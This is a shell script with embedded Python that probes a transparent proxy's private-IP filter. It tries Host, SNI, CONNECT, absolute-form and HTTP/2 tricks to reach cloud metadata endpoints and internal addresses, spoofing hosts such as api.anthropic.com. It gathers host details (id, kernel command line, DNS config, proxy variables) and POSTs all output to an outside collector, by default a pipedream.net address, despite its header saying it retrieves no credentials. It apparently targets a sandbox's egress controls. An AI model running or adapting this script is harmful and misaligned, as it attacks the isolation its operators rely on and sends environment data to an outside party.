#!/bin/sh
# proxy-confusion-fast.sh
#
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh proxy-confusion-fast.sh
#
# Purpose:
# - Test whether transparent proxy/private-IP filtering can be bypassed via
#   SNI / Host / CONNECT / absolute-form / HTTP2 authority confusion.
# - Keep runtime bounded.
#
# What it does NOT do:
# - No broad scanning.
# - No credential/token retrieval.
# - No disk reads.
# - No destructive actions.

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
SOCKET_TIMEOUT="${SOCKET_TIMEOUT:-2.0}"
POST_TIMEOUT="${POST_TIMEOUT:-20}"

(
set -x

echo "=============================="
echo "=== context =================="
echo "=============================="
date
id
uname -a
hostname -I 2>&1 || true
cat /proc/cmdline 2>&1 || true
cat /etc/resolv.conf 2>&1 || true
env | grep -Ei 'proxy|http_proxy|https_proxy|all_proxy|no_proxy' || true

echo
echo "=============================="
echo "=== baseline private filter =="
echo "=============================="
for u in \
  "http://169.254.169.254/" \
  "http://169.254.169.254/computeMetadata/v1/" \
  "http://10.0.0.1/" \
  "http://100.64.0.1/"
do
  echo "--- normal curl: $u"
  timeout 3 curl -i -sS --connect-timeout 0.5 --max-time 2 "$u" 2>&1 | sed -n '1,20p'

  echo "--- noproxy curl: $u"
  timeout 3 curl -i -sS --noproxy '*' --connect-timeout 0.5 --max-time 2 "$u" 2>&1 | sed -n '1,20p'
done

echo
echo "=============================="
echo "=== HTTP Host confusion ======"
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket
import os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

# Keep this small to avoid long runtime.
DST_IPS = ["169.254.169.254", "10.0.0.1", "100.64.0.1"]
HOSTS = [
    "169.254.169.254",
    "metadata.google.internal",
    "example.com",
    "api.anthropic.com",
]
PATHS = ["/", "/computeMetadata/v1/"]

def recv_limited(sock, limit=4096):
    out = b""
    while len(out) < limit:
        try:
            chunk = sock.recv(min(2048, limit - len(out)))
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
    return out

def probe_http(dst, host, path):
    print(f"=== HTTP dst={dst}:80 Host={host} path={path} ===")
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: audit-probe\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = socket.socket()
    s.settimeout(TIMEOUT)
    try:
        s.connect((dst, 80))
        s.sendall(req)
        data = recv_limited(s)
        print(data.decode("utf-8", "replace")[:4096])
    except Exception as e:
        print("FAIL", type(e).__name__, e)
    finally:
        try:
            s.close()
        except Exception:
            pass

for dst in DST_IPS:
    for host in HOSTS:
        # only metadata-like path for metadata authorities; root for public hosts
        if host in ("169.254.169.254", "metadata.google.internal"):
            probe_http(dst, host, "/computeMetadata/v1/")
        else:
            probe_http(dst, host, "/")
PY

echo
echo "=============================="
echo "=== TLS SNI / Host mismatch ="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket
import ssl
import os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

# Small matrix: enough to prove whether SNI/Host mismatch changes enforcement.
TESTS = [
    # dst, sni, host, path
    ("169.254.169.254", "example.com", "example.com", "/"),
    ("169.254.169.254", "example.com", "169.254.169.254", "/computeMetadata/v1/"),
    ("169.254.169.254", "api.anthropic.com", "api.anthropic.com", "/"),
    ("169.254.169.254", "api.anthropic.com", "169.254.169.254", "/computeMetadata/v1/"),
    ("169.254.169.254", "metadata.google.internal", "metadata.google.internal", "/computeMetadata/v1/"),

    ("10.0.0.1", "example.com", "example.com", "/"),
    ("10.0.0.1", "api.anthropic.com", "api.anthropic.com", "/"),

    ("100.64.0.1", "example.com", "example.com", "/"),
    ("100.64.0.1", "api.anthropic.com", "api.anthropic.com", "/"),
]

def recv_limited(sock, limit=4096):
    out = b""
    while len(out) < limit:
        try:
            chunk = sock.recv(min(2048, limit - len(out)))
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
    return out

for dst, sni, host, path in TESTS:
    print(f"=== TLS/H1 dst={dst}:443 SNI={sni} Host={host} path={path} ===")
    raw = socket.socket()
    raw.settimeout(TIMEOUT)
    try:
        raw.connect((dst, 443))
        ctx = ssl.create_default_context()
        ss = ctx.wrap_socket(raw, server_hostname=sni)
        print("TLS_OK", ss.version(), ss.cipher())
        cert = ss.getpeercert()
        print("CERT_SUBJECT", cert.get("subject"))
        sans = cert.get("subjectAltName")
        print("CERT_SAN_HEAD", sans[:5] if sans else None)

        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: audit-probe\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        ss.sendall(req)
        data = recv_limited(ss)
        print(data.decode("utf-8", "replace")[:4096])
        ss.close()
    except Exception as e:
        print("FAIL", type(e).__name__, e)
        try:
            raw.close()
        except Exception:
            pass
PY

echo
echo "=============================="
echo "=== CONNECT / absolute-form =="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket
import os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

DST_IPS = ["169.254.169.254", "10.0.0.1", "100.64.0.1"]

PAYLOADS = [
    (
        "absolute_public",
        b"GET http://example.com/ HTTP/1.1\r\n"
        b"Host: example.com\r\n"
        b"User-Agent: audit-probe\r\n"
        b"Connection: close\r\n\r\n",
    ),
    (
        "absolute_metadata",
        b"GET http://169.254.169.254/computeMetadata/v1/ HTTP/1.1\r\n"
        b"Host: 169.254.169.254\r\n"
        b"User-Agent: audit-probe\r\n"
        b"Connection: close\r\n\r\n",
    ),
    (
        "connect_public",
        b"CONNECT example.com:443 HTTP/1.1\r\n"
        b"Host: example.com:443\r\n"
        b"User-Agent: audit-probe\r\n\r\n",
    ),
    (
        "connect_metadata",
        b"CONNECT 169.254.169.254:80 HTTP/1.1\r\n"
        b"Host: 169.254.169.254:80\r\n"
        b"User-Agent: audit-probe\r\n\r\n",
    ),
    (
        "h2c_upgrade",
        b"GET / HTTP/1.1\r\n"
        b"Host: example.com\r\n"
        b"User-Agent: audit-probe\r\n"
        b"Connection: Upgrade, HTTP2-Settings\r\n"
        b"Upgrade: h2c\r\n"
        b"HTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n",
    ),
]

def recv_limited(sock, limit=4096):
    out = b""
    while len(out) < limit:
        try:
            chunk = sock.recv(min(2048, limit - len(out)))
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
    return out

for dst in DST_IPS:
    for name, payload in PAYLOADS:
        print(f"=== dst={dst}:80 payload={name} ===")
        s = socket.socket()
        s.settimeout(TIMEOUT)
        try:
            s.connect((dst, 80))
            s.sendall(payload)
            data = recv_limited(s)
            print(data.decode("utf-8", "replace")[:4096])
        except Exception as e:
            print("FAIL", type(e).__name__, e)
        finally:
            try:
                s.close()
            except Exception:
                pass
PY

echo
echo "=============================="
echo "=== curl HTTP/2 probes ======="
echo "=============================="
if curl --version 2>/dev/null | grep -qi 'HTTP2'; then
  for cmd in \
    "curl -k --http2 --connect-timeout 1 --max-time 3 --resolve example.com:443:169.254.169.254 https://example.com/" \
    "curl -k --http2 --connect-timeout 1 --max-time 3 --resolve example.com:443:169.254.169.254 -H 'Host: 169.254.169.254' https://example.com/computeMetadata/v1/" \
    "curl -k --http2 --connect-timeout 1 --max-time 3 --resolve api.anthropic.com:443:169.254.169.254 https://api.anthropic.com/" \
    "curl -k --http2 --connect-timeout 1 --max-time 3 --resolve metadata.google.internal:443:169.254.169.254 https://metadata.google.internal/computeMetadata/v1/"
  do
    echo "--- $cmd"
    # shellcheck disable=SC2086
    timeout 5 sh -c "$cmd" 2>&1 | sed -n '1,50p'
  done
else
  echo "curl lacks HTTP/2 support or curl unavailable"
  curl --version 2>&1 | sed -n '1,10p' || true
fi

echo
echo "=============================="
echo "=== summary hints ============"
echo "=============================="
echo "Look for any response other than x-deny-reason: private_dest_ip."
echo "Interesting outcomes:"
echo "- CONNECT returns 200 or establishes a tunnel"
echo "- SNI public + Host private returns metadata/internal content"
echo "- HTTP/2 behaves differently from HTTP/1.1"
echo "- absolute-form private URL bypasses destination checks"
echo "- direct/no-proxy curl differs from normal curl"

) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
